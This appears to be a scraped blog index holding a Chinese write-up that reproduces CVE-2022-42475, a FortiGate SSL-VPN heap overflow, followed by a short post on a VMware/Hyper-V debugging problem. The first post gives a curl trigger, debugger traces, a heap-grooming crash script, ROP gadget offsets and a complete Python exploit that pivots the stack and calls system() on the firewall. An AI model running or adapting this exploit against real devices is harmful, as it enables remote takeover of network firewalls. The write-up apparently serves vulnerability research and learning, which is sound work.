.text:0000000001811134.text:0000000001811134loc_1811134:;CODEXREF:sub_16E5DC0+21D↑j.text:0000000001811134;sslvpn_read_post_data_cb+527↓j.text:0000000001811134callpool_alloc.......text:0000000001811174loc_1811174:;CODEXREF:sslvpn_read_post_data_cb:loc_1811128↑j.text:0000000001811174moveax,[rax+18h].text:0000000001811177movrdi,[r12].text:000000000181117Bjmploc_1811406.......text:0000000001811406loc_1811406:;CODEXREF:sslvpn_read_post_data_cb+FB↑j.text:0000000001811406leaesi,[rax+1].text:0000000001811409jmploc_18115A4.......text:00000000018115A4loc_18115A4:;CODEXREF:sslvpn_read_post_data_cb+389↑j.text:00000000018115A4movsxdrsi,esi.text:00000000018115A7jmploc_1811134.......text:0000000001811134loc_1811134:;CODEXREF:sub_16E5DC0+21D↑j.text:0000000001811134;sslvpn_read_post_data_cb+527↓j.text:0000000001811134callpool_alloc......curl--noproxy'*'--data-binary@payload-H'Content-Length:115964116992'-vik'https://192.168.150.131:10443/remote/logincheck?AAAA=BBBB'这里存在整数溢出。那么我们可以构造特殊的CL值，比如0x1b00000000，经过运算拓展之后会变成0x1，在运行到pool_alloc函数的时候（注意，此函数被调用了很多次，建议运行到漏洞函数以后再在memset函数处下断点观察）分配内存如下：Breakpoint3,0x00000000016d1badin??()LEGEND:STACK|HEAP|CODE|DATA|RWX|RODATA────────────────────────────────[REGISTERS/show-flagsoff/show-compact-regsoff]─────────────────────────────────*RAX0x7fc0cc200448◂—0x0*RBX0x8RCX0x7fc0cc0b7a18—▸0x7fc0cc0d6418—▸0x7fc0cc0d64f0◂—0x7fc0cc0b7a18*RDX0x1*RDI0x7fc0cc200440◂—0x0*RSI0x0R80x7fc0cc200440◂—0x0R90x0R100x0R110x246R120x7fc0cc1fe058—▸0x7fc0cc1fe018—▸0x7fc0cc1fe000—▸0x7fc0cc1fe400—▸0x7fc0cc1fe800◂—...*R130x1R140x0R150x7fc0cc0d64f0—▸0x7fc0cc0b7a18—▸0x7fc0cc0d6418◂—0x7fc0cc0d64f0*RBP0x7ffd87902f00—▸0x7ffd87902f30—▸0x7ffd87902f80—▸0x7ffd87902fb0—▸0x7ffd87902fe0◂—...*RSP0x7ffd87902ee0◂—0x0*RIP0x16d1bad◂—call0x43c500─────────────────────────────────────────[DISASM/x86-64/setemulateon]──────────────────────────────────────────►0x16d1badcallmemset@plt&lt;memset@plt&gt;s:0x7fc0cc200440◂—0x0c:0x0n:0x10x16d1bb2movr8,rax0x16d1bb5addrsp,80x16d1bb9movrax,r80x16d1bbcpoprbx0x16d1bbdpopr120x16d1bbfpopr130x16d1bc1poprbp0x16d1bc2ret0x16d1bc3nopdwordptr[rax+rax]0x16d1bc8moveax,dwordptr[rip+0x940f5b6]───────────────────────────────────────────────────────[STACK]───────────────────────────────────────────────────────00:0000│rsp0x7ffd87902ee0◂—0x001:0008│-0180x7ffd87902ee8—▸0x7fc0cc0fd018—▸0x7fc0ccc54ae8—▸0x7fc0cc0d62f0—▸0x7fc0cc1fe018◂—...02:0010│-0100x7ffd87902ef0—▸0x7fc0cc1fe058—▸0x7fc0cc1fe018—▸0x7fc0cc1fe000—▸0x7fc0cc1fe400◂—...03:0018│-0080x7ffd87902ef8—▸0x7fc0ccc54800—▸0x7fc0cc0b7418—▸0x7fc0cc0b7400—▸0x7fc0cc0b7800◂—...04:0020│rbp0x7ffd87902f00—▸0x7ffd87902f30—▸0x7ffd87902f80—▸0x7ffd87902fb0—▸0x7ffd87902fe0◂—...05:0028│+0080x7ffd87902f08—▸0x1811139◂—movqwordptr[rbx+8],rax06:0030│+0100x7ffd87902f10◂—0x007:0038│+0180x7ffd87902f18—▸0x7fc0ccc54800—▸0x7fc0cc0b7418—▸0x7fc0cc0b7400—▸0x7fc0cc0b7800◂—...─────────────────────────────────────────────────────[BACKTRACE]─────────────────────────────────────────────────────►00x16d1bad10x181113920x180ab0d30x180c1c040x180c29e50x180c7b160x180da5c70x180ede2缓冲区是位于heap的一块较小内存，而size已经变成0x1。这样pool_alloc返回了一块较小的堆内存，假设此时我们在POST请求体中构造了超长的数据，那么在后续的memcpy阶段就会导致堆内存溢出。Breakpoint4,0x0000000001811162in??()LEGEND:STACK|HEAP|CODE|DATA|RWX|RODATA────────────────────────────────[REGISTERS/show-flagsoff/show-compact-regsoff]─────────────────────────────────*RAX0x1b00000000*RBX0x7fc0cc0fd018—▸0x7fc0ccc54ae8—▸0x7fc0cc0d62f0—▸0x7fc0cc1fe018—▸0x7fc0cc1fe000◂—...*RCX0x1ffe*RDX0x1ffeRDI0x7fc0cc200440◂—0x0*RSI0x7fc0cc0fd038◂—0x4141414141414141('AAAAAAAA')*R80x16*R90x7fc0cc0fd080◂—0x4141414141414141('AAAAAAAA')*R100x7fc0cc0bdfb0◂—0x0*R110x7fc0cc0ff016◂—'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'*R120x1ffe*R130x7fc0ccc54800—▸0x7fc0cc0b7418—▸0x7fc0cc0b7400—▸0x7fc0cc0b7800—▸0x7fc0cc0b7c00◂—...*R140x7fc0cc0fd038◂—0x4141414141414141('AAAAAAAA')R150x7fc0cc0d64f0—▸0x7fc0cc0b7a18—▸0x7fc0cc0d6418◂—0x7fc0cc0d64f0*RBP0x7ffd87902f30—▸0x7ffd87902f80—▸0x7ffd87902fb0—▸0x7ffd87902fe0—▸0x7ffd87905120◂—...*RSP0x7ffd87902f10◂—0x0*RIP0x1811162◂—call0x4404a0─────────────────────────────────────────[DISASM/x86-64/setemulateon]──────────────────────────────────────────►0x1811162callmemcpy@plt&lt;memcpy@plt&gt;dest:0x7fc0cc200440◂—0x0src:0x7fc0cc0fd038◂—0x4141414141414141('AAAAAAAA')n:0x1ffe0x1811167movrdi,qwordptr[rbx+0x10]0x181116bmovrax,qwordptr[rbx+0x18]0x181116fjmp0x18110e7&lt;0x18110e7&gt;0x1811174moveax,dwordptr[rax+0x18]0x1811177movrdi,qwordptr[r12]0x181117bjmp0x1811406&lt;0x1811406&gt;0x1811180pushrbp0x1811181movrbp,rsp0x1811184pushr140x1811186pushr13───────────────────────────────────────────────────────[STACK]───────────────────────────────────────────────────────00:0000│rsp0x7ffd87902f10◂—0x001:0008│-0180x7ffd87902f18—▸0x7fc0ccc54800—▸0x7fc0cc0b7418—▸0x7fc0cc0b7400—▸0x7fc0cc0b7800◂—...02:0010│-0100x7ffd87902f20—▸0x7fc0cc0b79b8—▸0x7fc0cc0b7418—▸0x7fc0cc0b7400—▸0x7fc0cc0b7800◂—...03:0018│-0080x7ffd87902f28◂—0x004:0020│rbp0x7ffd87902f30—▸0x7ffd87902f80—▸0x7ffd87902fb0—▸0x7ffd87902fe0—▸0x7ffd87905120◂—...05:0028│+0080x7ffd87902f38—▸0x180ab0d◂—movrcx,qwordptr[rbp-0x38]06:0030│+0100x7ffd87902f40—▸0x7ffd87902f50—▸0x7ffd87902f80—▸0x7ffd87902fb0—▸0x7ffd87902fe0◂—...07:0038│+0180x7ffd87902f48—▸0x7fc0cc0b7a18—▸0x7fc0cc0d6418—▸0x7fc0cc0d64f0◂—0x7fc0cc0b7a18─────────────────────────────────────────────────────[BACKTRACE]─────────────────────────────────────────────────────►00x181116210x180ab0d20x180c1c030x180c29e40x180c7b150x180da5c60x180ede270x449eaf───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────pwndbg&gt;但函数sslvpn_read_post_data_cb是一个回调函数，用于处理通过SSLVPN接收到的POST请求数据。它不是一次性处理所有数据，而是被循环调用来读取和处理数据块，直到整个请求体被处理完毕或发生错误。我们的payload非常大(100000字节)，远超单次读取的8190字节，所以sslvpn_read_post_data_cb被反复调用，每次处理一小块数据，直到所有数据都被（尝试）拷贝。经过多次循环调用sslvpn_read_post_data_cb和memcpy，堆内存已经被大量覆盖。程序继续执行其他逻辑。最终在0x16e3c27:movzxeax,byteptr[r14+0x41]处崩溃。pwndbg&gt;ProgramreceivedsignalSIGSEGV,Segmentationfault.0x00000000016e3c27in??()LEGEND:STACK|HEAP|CODE|DATA|RWX|RODATA────────────────────────────────[REGISTERS/show-flagsoff/show-compact-regsoff]─────────────────────────────────RAX0x7fc0cc200e28◂—0x4141414141414141('AAAAAAAA')RBX0x7fc0cc1fe058—▸0x7fc0cc1fe018—▸0x7fc0cc1fe000—▸0x7fc0cc1fe400—▸0x7fc0cc1fe800◂—...RCX0x68RDX0x0RDI0x7fc0cc1fe058—▸0x7fc0cc1fe018—▸0x7fc0cc1fe000—▸0x7fc0cc1fe400—▸0x7fc0cc1fe800◂—...RSI0x323e9c3◂—'text/html;charset=utf-8'R80x0R90x0R100x7fc0d1adf020(__strcasecmp_l_avx+4880)◂—vpslldqxmm2,xmm2,2R110x0R120x323e9c3◂—'text/html;charset=utf-8'R130xaaf50e0◂—'Fortinet_Factory'R140x4141414141414141('AAAAAAAA')R150x7fc0cc1fe058—▸0x7fc0cc1fe018—▸0x7fc0cc1fe000—▸0x7fc0cc1fe400—▸0x7fc0cc1fe800◂—...RBP0x7ffd87902ec0—▸0x7ffd87902f10—▸0x7ffd87902f70—▸0x7ffd87902f90—▸0x7ffd87902fe0◂—...RSP0x7ffd87902e80—▸0x3685072◂—'text/plain'RIP0x16e3c27◂—movzxeax,byteptr[r14+0x41]─────────────────────────────────────────[DISASM/x86-64/setemulateon]──────────────────────────────────────────►0x16e3c27movzxeax,byteptr[r14+0x41]0x16e3c2candeax,0x180x16e3c2fcmpal,80x16e3c31je0x16e3c60&lt;0x16e3c60&gt;↓0x16e3c60movesi,0x316001f0x16e3c65movrdi,r120x16e3c68call0x16f3d70&lt;0x16f3d70&gt;0x16e3c6dtestrax,rax0x16e3c70jne0x16e3c33&lt;0x16e3c33&gt;0x16e3c72lear13,[rbp-0x40]0x16e3c76movesi,0x3685072───────────────────────────────────────────────────────[STACK]───────────────────────────────────────────────────────00:0000│rsp0x7ffd87902e80—▸0x3685072◂—'text/plain'01:0008│-0380x7ffd87902e88—▸0x2f7fc4a◂—'text/html'02:0010│-0300x7ffd87902e90◂—0x003:0018│-0280x7ffd87902e98◂—0xbcc68fe117a6a70004:0020│-0200x7ffd87902ea0—▸0x7fc0cc1fe058—▸0x7fc0cc1fe018—▸0x7fc0cc1fe000—▸0x7fc0cc1fe400◂—...05:0028│-0180x7ffd87902ea8—▸0x7fc0cc1fe058—▸0x7fc0cc1fe018—▸0x7fc0cc1fe000—▸0x7fc0cc1fe400◂—...06:0030│-0100x7ffd87902eb0—▸0xaaf50e0◂—'Fortinet_Factory'07:0038│-0080x7ffd87902eb8—▸0x7fc0ccc54800—▸0x7fc0cc0b7418—▸0x7fc0cc0b7400—▸0x7fc0cc0b7800◂—...─────────────────────────────────────────────────────[BACKTRACE]─────────────────────────────────────────────────────►00x16e3c2710x16e592320x16e733e30x180a0cf40x180c50550x180c78260x180da5c70x180ede2──────────────────────────────────────────────────────────────────────────────────────────此时，查看寄存器R14的值是0x4141414141414141('AAAAAAAA')。这明确地表明：之前的堆溢出已经覆盖了某个变量或指针，该变量/指针的值后来被加载到了R14寄存器中。现在，程序试图将R14(即0x4141...)当作一个基地址，并尝试读取[R14+0x41]处的内存。由于0x4141...是一个无效的、由输入数据控制的地址，访问它自然会导致段错误(SegmentationFault)。漏洞利用劫持函数指针随便填充数据的话，最后很难达到一个可以利用的crash，我看Catalpa这里直接就能触发jmprax感觉还是挺不可思议的，我试了很多次，基本只能跳转到上面的movzxeax,byteptr[r14+0x41]那应该怎么才能成功劫持一个函数指针呢？这里我试了很多方法，感觉还是hac425的思路稳定清晰，易于实现简单来说，还是使用堆风水手法文章中给出了完整的漏洞利用思路，这里我先拆开，单说如何成功劫持函数指针（应该是handshake函数的指针，orange的文章里有提到过）创建60个sock连接，并发送不完整的http请求，希望能在服务端分配多个SSL结构体从第40个开始间隔释放10个sock链接，希望在服务端释放几个SSL结构体的Hole.分配用于溢出的exp_sk再分配20个sock连接，多分配几个SSL结构体触发溢出，希望修改SSL结构体中的函数指针给其他socket发送数据，等待函数指针调用这里给出溢出脚本：importsocketimportsslfrompwnimport*path=&quot;/remote/login&quot;.encode()ip=&quot;192.168.150.131&quot;port=10443defcreate_ssl_ctx():_socket=socket.socket(socket.AF_INET,socket.SOCK_STREAM)_socket.connect((ip,port))_default_context=ssl._create_unverified_context()_socket=_default_context.wrap_socket(_socket)return_socketsocks=[]foriinrange(60):sk=create_ssl_ctx()data=b&quot;POST&quot;+path+b&quot;HTTP/1.1\\r\\nHost:192.168.150.131\\r\\nContent-Length:4096\\r\\nUser-Agent:Mozilla/5.0\\r\\nContent-Type:text/plain;charset=UTF-8\\r\\nAccept:*/*\\r\\n\\r\\na=1&quot;sk.sendall(data)socks.append(sk)#sleep(1)foriinrange(20,40,2):sk=socks[i]sk.close()socks[i]=NoneCL=&quot;115964116992&quot;data=b&quot;POST&quot;+path+b&quot;HTTP/1.1\\r\\nHost:192.168.150.131\\r\\nContent-Length:&quot;+CL.encode()+b&quot;\\r\\nUser-Agent:Mozilla/5.0\\r\\nContent-Type:text/plain;charset=UTF-8\\r\\nAccept:*/*\\r\\n\\r\\na=1&quot;exp_sk=create_ssl_ctx()foriinrange(20):sk=create_ssl_ctx()socks.append(sk)exp_sk.sendall(data)exp_sk.sendall(b'\\x90'*0x10000)forskinsocks:ifsk:data=b'C'*40sk.sendall(data)print(&quot;done&quot;)这里有几点说明一下：用于溢出的exp_sk这里，其实host根本不重要，填什么都可以，实际连接目标由create_ssl_ctx()中的_socket.connect((ip,port))决定，重要的是cl值，只要cl值对，加上是一个应用层HTTP协议头，就能够触发ssl/tls库或许会对触发crash有所影响，建议不要使用Ubuntu16，因为我一开始在Ubuntu16上进行了大量尝试，都不能触发crash，最后是依靠一种有点玄学的手段才能触发，后来发现跟Ubuntu16环境有关，具体来说在Ubuntu22跟win11上的崩溃脚本都能稳定触发crash，但唯独Ubuntu16不可以，其中，Ubuntu16Python版本为2.7.12，Ubuntu22为2.7.18，win11为3.11.9我怀疑是OpenSSL版本问题，因为16使用的是OpenSSL1.0.2g，而Ubuntu22.04/win11都是OpenSSL3.0.x查看了FortiGate7.2.4（我的实验虚拟机）：显示setssl-min-proto-versionTLSv1-2:，最低要求使用TLS1.2进行连接，但其实Ubuntu16也是满足要求的，所以也不能彻底确定，或许之后有兴趣会继续探究最后，在前人基础上，也是实现了jmpcrash这一步确定偏移直接用cyclic，简单粗暴将脚本略作修改：exp_sk.sendall(data)cyclic_pattern=cyclic(PATTERN_LENGTH,n=8)exp_sk.sendall(cyclic_pattern)#exp_sk.sendall(b'\\x42'*0x10000)具体分析__int64__fastcallsub_1811260(__int64a1,__int64a2){intv2;//r14d__int64v4;//rbx__int64v5;//rax_DWORD*v6;//rax__int64v7;//rsiv2=30;v4=sub_18174B0(*(unsignedint*)(a1+144));register_named_callback(a2,&quot;send_expect_100&quot;,0LL,4LL,sub_1811020);register_named_callback(a2,&quot;read_post_data&quot;,0LL,1LL,sslvpn_read_post_data_cb);sub_181BD70(a2,sub_1810F80);sub_181BD90(a2,sub_1811180);if(v4)v2=*(_DWORD*)(v4+68);v5=sub_181B860(a1);if(!v5||(v6=*(_DWORD**)(v5+56))==0LL||(v7=1000LL,(unsignedint)(*v6-6)&lt;=2))v7=(unsignedint)(100*v2);sub_181BD80(a2,v7,0LL);return0LL;}这是SSL结构体初始化函数why：目标参数a2:函数接收a2作为参数，并且随后多次将a2作为第一个参数传递给其他sub_...函数（如sub_181BC20,sub_181BD70,sub_181BD90,sub_181BD80）。这通常意味着这些被调用的函数是在操作或设置a2指向的那个数据结构。这里会把字符串read_post_data拷贝到距离结构体偏移为200的地方溢出函数指针：__int64__fastcallsub_180C0A0(__int64a1,chara2){......if(v9){result=v8+96;if(v9!=v8+96){v10=*(__int64(__fastcall**)(__int64))(v9+192);if(v10)returnv10(a1);......}这里看出，我们要劫持的函数指针在结构体偏移为192的地方。所以我们只要找到字符串read_post_data，将它的地址减8，就能得到函数指针地址，再确定溢出开始的地址，两者相减，就得到了具体偏移(gdb)ir$rdirdi0x7f6edef01818140114163406872(gdb)x/10gx0x7f6edef018180x7f6edef01818:0x00000000000000000x00000000000000000x7f6edef01828:0x00000000000000000x00000000000000000x7f6edef01838:0x00000000000000000x00000000000000000x7f6edef01848:0x00000000000000000x00000000000000000x7f6edef01858:0x00000000000000000x0000000000000000(gdb)x/10gx0x7f6edef026380x7f6edef02638:0x00000000000000000x736f705f646165720x7f6edef02648:0x0000617461645f740x00000000000000000x7f6edef02658:0x00000000000000000x00000000000000000x7f6edef02668:0x00000000000000000x00000000000000000x7f6edef02678:0x00000000000000000x0000000000000000(gdb)x/s0x7f6edef026400x7f6edef02640:&quot;read_post_data&quot;栈迁移​仅仅控制程序跳转到一个地址通常是不够的。为了执行更复杂的操作，比如设置参数并调用system函数来执行命令，需要执行一系列指令。在有NX(No-eXecute)保护的系统上，不能简单地直接跳转到堆上你写入的shellcode来执行。因此，最常用的技术是面向返回的编程(Return-OrientedProgramming,ROP)。​目标：找到一个gadget，它的功能是将RSP的值修改为你可控的某个地址，这个地址指向我们在堆溢出数据中布置好的ROP链。看我们现在的GDB，rax跟rdx是可以被控制的，rax是用来控制流劫持的，所以，我们要找到一个类似pushrdx;poprsp;ret这样的，将rdx的值转为栈基址，从而实现栈迁移augustu@augustu-ubuntu22:~/Downloads/f724$grep&quot;.*push.*rdx.*pop.*rsp.*ret.*&quot;gadgets.txt0x0000000002b08c46:clc;pushqwordptr[rsi+rdx*2+0x41];poprsp;popr13;poprbp;ret0x00000000019ff110:poprsp;pushrdx;addbl,byteptr[rbx+0x41];poprsp;poprbp;ret0x0000000002b08c47:pushqwordptr[rsi+rdx*2+0x41];poprsp;popr13;poprbp;ret0x0000000001d3379c:pushrdx;adcbyteptr[rbx+0x41],bl;poprsp;poprbp;ret0x00000000019ff111:pushrdx;addbl,byteptr[rbx+0x41];poprsp;poprbp;ret这里找不到，只能使用类似的0x1d3379c算出来rax偏移为3613，rdx偏移为34210x00000000005bb1e4:poprdi;ret0x0000000001143c4e:poprsi;ret0x000000000264c78a:poprdx;ret构造ROP具体思路rax跟rdx偏移已经算出来了，所以我们的payload应该形如这样：|AAA（3421）|ROP_chain|CCC（192-len(payload)）|pivot_gadget|pivot_gadget就是我们刚刚选择的0x1d3379c:pushrdx;adcbyteptr[rbx+0x41],bl;poprsp;poprbp;ret注意，AAA（3421）|ROP_chain|CCC（192-len(payload)）这里的长度为3421+192=3613，加上我们前面提到的jmprax这个crash，所以这里rax会被赋值为pivot_gadget：0x1d3379c这里会将rdx的值（也就是我们ROP_chain的其实地址）压到栈中，然后poprsp改变栈基址注意，因为后面还有一句poprbp，会把rsp的值+8，所以ROP_chain开头要填充八个字节，下面就可以随意构造我们的ROP_chain了我们的最终目标是构造system(cmd,0,0)所以，要达成如下目标：rdi寄存器指向cmd命令的地址rsi寄存器值为0rdx寄存器值为0后面两项很好解决，寻找poprdx;ret以及poprsi;ret这两个gadget就可以但因为程序中没有现成的命令，需要我们自己构造，我们就需要自己计算命令行字符串的地址，这里提供一种方法：将cmd_string=b&quot;/bin/busyboxecho&gt;2.txt&quot;+b'\\x00'*7放在ROP_chain的最后（末尾要加7个0x00是因为/bin/busyboxecho&gt;2.txt一共有25个字节，读取字符串的时候需要读到0x00表示结束，25+7=32刚好为8的倍数）但我们传给rdi需要为字符串的地址，注意：一开始的时候我们传给rdx的值就是ROP_chain的开头地址开头的b'B'*8跟最后的字符串之间的长度是固定的所以我们只需要给一个寄存器赋值为这个偏移，再让rdx加上这个寄存器，最后赋值给rdi就达到了我们的目的-&gt;给rdi寄存器传cmd命令的地址这里我选用rax寄存器作为这个目标寄存器构造过程一开始需要把偏移传给rax寄存器，应该找一个poprax;ret，然后后面加上offset，就能达到给rax赋值的目的，但这里我遇到了一个很奇怪的事情：offset不能成功写入栈中，栈上把offset后面的一个gadgets写了两次，这里我始终没有思考明白这里我最后只能写了两次offset（写两次offset反而能正常的都写入栈中），为了弹出多的一个offset，我只能放弃使用poprax;ret，寻找了一个里面能多pop掉一个的gadgets后面我使用了addrax,rdx;ret，因为这个gadgets会将值加到rax寄存器上，所以要继续寻找一个类似pushrax;poprdi;ret的gadgets，但没有找到，只找到了0x0000000002ac0cb3:pushrax;poprbx;popr12;poprbp;ret因为多了两个pop，后面多加了两个junk来平衡栈然后就是pushrbx;poprdi;ret将字符串地址传到rdi了后面就是将rsi、rdx置0结果可以看到，最终各个寄存器成功赋值，命令成功构造exp完整利用脚本如下：importsocketimportsslfrompwnimport*path=&quot;/remote/login&quot;.encode()ip=&quot;192.168.150.131&quot;port=10443PATTERN_LENGTH=8000defcreate_ssl_ctx():_socket=socket.socket(socket.AF_INET,socket.SOCK_STREAM)_socket.connect((ip,port))_default_context=ssl._create_unverified_context()_socket=_default_context.wrap_socket(_socket)return_socketsocks=[]foriinrange(60):sk=create_ssl_ctx()data=b&quot;POST&quot;+path+b&quot;HTTP/1.1\\r\\nHost:192.168.150.131\\r\\nContent-Length:4096\\r\\nUser-Agent:Mozilla/5.0\\r\\nContent-Type:text/plain;charset=UTF-8\\r\\nAccept:*/*\\r\\n\\r\\na=1&quot;sk.sendall(data)socks.append(sk)foriinrange(20,40,2):sk=socks[i]sk.close()socks[i]=NoneCL=&quot;115964116992&quot;data=b&quot;POST&quot;+path+b&quot;HTTP/1.1\\r\\nHost:192.168.150.131\\r\\nContent-Length:&quot;+CL.encode()+b&quot;\\r\\nUser-Agent:Mozilla/5.0\\r\\nContent-Type:text/plain;charset=UTF-8\\r\\nAccept:*/*\\r\\n\\r\\na=1&quot;exp_sk=create_ssl_ctx()foriinrange(20):sk=create_ssl_ctx()socks.append(sk)exp_sk.sendall(data)pop_rax_pop_rbx_ret=p64(0x2982884)add_rax_rdx_ret=p64(0x462268)push_rax_pop_rbx_pop_r12_pop_rbp_ret=p64(0x2ac0cb3)push_rbx_pop_rdi_ret=p64(0x80ede9)pop_rsi_ret=0x1143c4epop_rdx_ret=0x264c78asystem_plt=0x56DF45pivot_gadget=p64(0x1d3379c)cmd_string=b&quot;/bin/busyboxecho&gt;2.txt&quot;+b'\\x00'*7offset=0x70rop_chain=b&quot;B&quot;*8rop_chain+=pop_rax_pop_rbx_retrop_chain+=p64(offset)rop_chain+=p64(offset)#rop_chain+=pop_r12_retrop_chain+=add_rax_rdx_retrop_chain+=push_rax_pop_rbx_pop_r12_pop_rbp_retrop_chain+=b'F'*16rop_chain+=push_rbx_pop_rdi_retrop_chain+=p64(pop_rsi_ret)rop_chain+=p64(0)rop_chain+=p64(pop_rdx_ret)rop_chain+=p64(0)rop_chain+=p64(system_plt)rop_chain+=cmd_stringpayload=b'A'*3421+rop_chain+b'C'*(192-len(rop_chain))+pivot_gadget+b'D'*200exp_sk.sendall(payload)forskinsocks:ifsk:data=b'C'*40sk.sendall(data)print(&quot;done&quot;)面试要点PDD面试的时候问到了这个漏洞，记录一下要点，一年前复现的，好多忘了“如何通过覆盖堆上函数指针，然后实现对栈指针RBP和RSP的控制？”我觉得想要解释这个问题，就要先解释劫持函数指针的部分​正如我复现过程中发现的，正常构造特殊CL值只能造成进程崩溃，而不能实现漏洞利用，因为漏洞函数处是一个回调函数，它不是一次性处理所有数据，而是循环调用来处理数据块，直到整个请求体处理完毕或者发生错误，如果我们的附加数据庞大的话，它会造成溢出，如果我们不另外附加数据，甚至进程会正常运行，如果溢出，只有在后面触发的时候，才会造成进程崩溃；​这时候，如果我们想覆盖堆上函数指针，就需要进行堆风水，简单来说，先布好局，让我们想要的结构体刚好处在溢出部分的边上，这样，溢出的时候就能覆盖到结构体的关键指针处，这时候如果我们的溢出数据是通过cyclic生成的，直接就能计算出偏移位置，这样，就成功覆盖了堆上的函数指针并获取偏移；下面就是栈迁移的部分​这时候只能一次跳转，我们需要将跳转位置转移到我们能控制的地方，要把我们堆上的数据变成栈上的​这时候最理想的方式就是找一个gadgets，把rsp的值修改成我们堆上数据的地址，这个漏洞我们可控的寄存器有rax、rdx，并且rax还用于上一步的控制流劫持，那我们就要找一个类似pushrdx;poprsp;ret这样的，将rdx的值转换成栈基址，至于rbp，这点倒是无须关心，因为后续都是ROP链利用，直接进行rce，不需要执行原有代码了堆溢出时，伪造的Content-Length如何精确导致了后续memcpy可控大小的溢出，以及堆布局在其中的作用。简单来说，有一个函数，pool_alloc负责根据传入的CL值分配内存空间，但在具体汇编代码中，它会将存储CL值的结构体里的某个元素先转移到eax上（原来这个元素的值存储的位置是rax+0x18）这样的话，如果CL值非常庞大就会导致前面的八位消失，比如0x1b00000000存到eax中，因为eax是32位寄存器，它只能存储0x00000000，后面的汇编代码中虽然又用到了rax，但这时候值已经被改变了，我记得是有一个leaesi,[rax+1]导致最后分配内存的时候，只能按照[eax+1]的值分配内存大小并且后面会有memcpy函数会将我们附加的payload写入内存中，这就很容易造成堆溢出加上我们之前使用堆风水进行的布局，就会导致payload溢出到关键结构体的函数指针中","link":"https://augu5tu.github.io/post/cve-2022-42475-reproduction-summary/"},{"title":"vmware 双机联调 不能下断点 debug 问题","content":"在复现CVE-2022-42475FortiGate防火墙漏洞时遇到了一个问题跟着CVE-2022-42475FortiGateSSLVPN堆溢出漏洞分析与利用和CVE-2022-42475复现研究、CVE-2022-42475做了前面的环境准备和提取二进制等工作后在通过patch绕过文件系统校验这一步卡住了具体情况使用vmlinux-to-elf将flatkc文件转换为elf文件后，使用gdb加载，再targetremote进行远程连接后在callfgt_verify处下断点，但只要开始c那么FortiGate虚拟机就会直接关闭这个问题困扰了我们很长时间，刚刚算了一下，到现在快两个月了，终于找到了解决方法解决方法关闭hyper-v和DeviceGuard禁用DeviceGuard或CredentialGuard在主机操作系统上，右键单击“开始”&gt;“运行”，键入gpedit.msc，然后单击“**确定”。**本地组策略编辑器打开。转至本地计算机策略&gt;计算机配置&gt;管理模板&gt;系统&gt;DeviceGuard（或者是：设备防护）&gt;启用基于虚拟化的安全性。选择已禁用。以管理员身份运行WindowsPowershell(管理员)（Windows键+X）​运行下面命令并重启电脑：bcdedit/sethypervisorlaunchtypeoff这时候再进行尝试的话，一句话，怎么调怎么有原因探究我查看了Microsoft的官方文档介绍，这个也就是他说的内存完整性的另一个名字，对于这个内存完整性，文档介绍是内存完整性是Windows中提供的基于虚拟化的安全(VBS)功能。内存完整性和VBS改进了Windows的威胁模型，并针对试图利用Windows内核的恶意软件提供更强大的保护。VBS使用Windows虚拟机监控程序创建独立的虚拟环境，该环境成为假定内核可能遭到入侵的OS的信任根。内存完整性是一个关键组件，它通过在VBS的独立虚拟环境中运行内核模式代码完整性来保护和强化Windows。内存完整性还限制可用于破坏系统的内核内存分配。内存完整性功能保护内核模式驱动程序的控制流防护(CFG)位图的修改。保护内核模式代码完整性进程，确保其他受信任的内核进程具有有效的证书。第一个功能，我找了几篇介绍CFG的文章看了一下，感觉是为了防止对内核模式驱动程序的控制流进行恶意修改。如果我尝试在虚拟机内通过修改控制流来影响内核模式驱动程序，内存完整性功能可能会检测到这样的修改，然后结束这个进程，造成我虚拟机直接退出的情况，我觉得是很有可能的第二个功能我不太了解进程证书的情况，不知道会不会产生什么影响但总的来说，在一个虚拟机里用GDB连接到另一个虚拟机，而且还在它启动的时候改内存，感觉触发内存完整性功能的检测还是挺有可能的，因为这涉及对内核模式代码的操作，尤其是对控制流的修改，也刚好能解释为什么不下断点能够正常运行，因为并没有修改控制流然后我尝试了再次开启hyper-v，在内存完整性关闭的情况下，仍然会同样断开Hyper-V利用硬件虚拟化技术（如IntelVT-x或AMD-V）来提高虚拟机性能，并支持在虚拟机中运行受保护的内核模式代码。虚拟化本身引入了一些额外的层次，可能会影响对内存和控制流的访问，之前VMware官方人员要求关闭也不是没有理由的。辛酸历程简单回顾一下这段时间的辛酸历程，我都不太相信我能成功了开头两周配了个防火墙环境，当时官网上下载的726的固件完了就是二进制提取，然后静态分析啥的，到这里还一切正常然后开始做，调试，遇到问题，怀疑是不是断点没下好啊，又开始分析，还寄希望于能够通过静态分析和动调找到到底是哪里让我们结束了这个程序中间各种分析，找了结束程序的函数、重启函数，我记得当时TAO还创了一个秒表法，根据时间来判断会进到哪一个函数，祈祷运气特别好就遇到了正确的地方，中间n了好长时间，分析的眼都花了，各个函数分析吐了后来放弃了，觉得不行咱们先找师兄，用他做过的固件做一下，这时候开始做7.2.4中间师兄亲自下场，可惜相同的地方遇到了相同的问题之后期末周，又被折磨了快一个月然后开始想，到底是哪边可能有问题，觉得还是调试的部分，直接用什么也没改的固件开始调惊讶的发现，ctmd，啥也没改也断不了，中间一步一步n，看为什么断，总是在各种奇奇怪怪的地方出问题师兄感觉这个可能是gdb或者Ubuntu版本问题，我感觉也确实有可能，又开始配了一波环境，16，18，20，22，gdb、peda、pwndbg排列组合都试了，大同小异师兄又来操作了一波，还专门写了个脚本，昨晚帮我们干到7：30才去吃完饭，食堂都快下班了，还是没能成功最后实在没辙，用师兄的老电脑试了，人就是能成，我TM就是成不了开始挨个排查，文件换师兄的，没用；FortiGate固件直接换，也没用；Ubuntu16也直接换，还是没用，啥都一样了，不可能是VMware版本吧，没辙了，先试试在换vm16的时候看见提示，说Hyper-v或者DeviceGuard未关闭啥的，我一想，不对啊，我不早就关了吗挺早的时候，网上查了相关的问题，VMware的官方支持团队答过一个沾了一点边的，说hyper-v要关掉，另外，这个问题好像网上没有说过的然后终于能够成功试了又将VMware升级到17，还是能够成功，一句话，怎么试怎么有了我都想买个失败总是贯穿人生始终放桌子上了，终于，还是没有被贯穿到底","link":"https://augu5tu.github.io/post/vmware-debug-problem/"}]}